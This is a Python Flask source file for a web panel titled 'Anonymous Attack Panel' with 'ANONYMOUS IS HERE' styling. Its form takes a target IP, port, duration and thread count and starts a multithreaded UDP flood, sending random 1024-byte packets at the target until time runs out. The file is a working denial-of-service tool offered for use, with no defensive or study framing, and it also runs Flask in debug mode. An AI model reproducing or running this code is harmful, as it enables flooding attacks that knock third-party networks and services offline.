
from flask import Flask, render_template_string, request
import threading
import socket
import random
import time

app = Flask(__name__)

html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Anonymous Attack Panel</title>
  <style>
    body {
      background: black;
      color: red;
      font-family: monospace;
      text-align: center;
      background-image: url('https://i.imgur.com/fYh3mEy.gif');
      background-size: cover;
    }
    h1 {
      font-size: 3rem;
      text-shadow: 0 0 10px red;
    }
    form {
      margin-top: 50px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 1rem;
      background: black;
      color: red;
      border: 2px solid red;
    }
  </style>
</head>
<body>
  <h1>ANONYMOUS IS HERE</h1>
  <form method="POST">
    <input type="text" name="ip" placeholder="Target IP"><br>
    <input type="text" name="port" placeholder="Port"><br>
    <input type="text" name="duration" placeholder="Time (sec)"><br>
    <input type="text" name="threads" placeholder="Threads"><br>
    <button type="submit">Start Attack</button>
  </form>
</body>
</html>
"""

# دالة الهجوم
def attack(ip, port, duration, threads):
    timeout = time.time() + duration
    def run():
        data = random._urandom(1024)
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (ip, port))
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=run).start()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ip = request.form['ip']
        port = int(request.form['port'])
        duration = int(request.form['duration'])
        threads = int(request.form['threads'])
        threading.Thread(target=attack, args=(ip, port, duration, threads)).start()
        return "🩸 Attack Started. Check Console."

    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True)
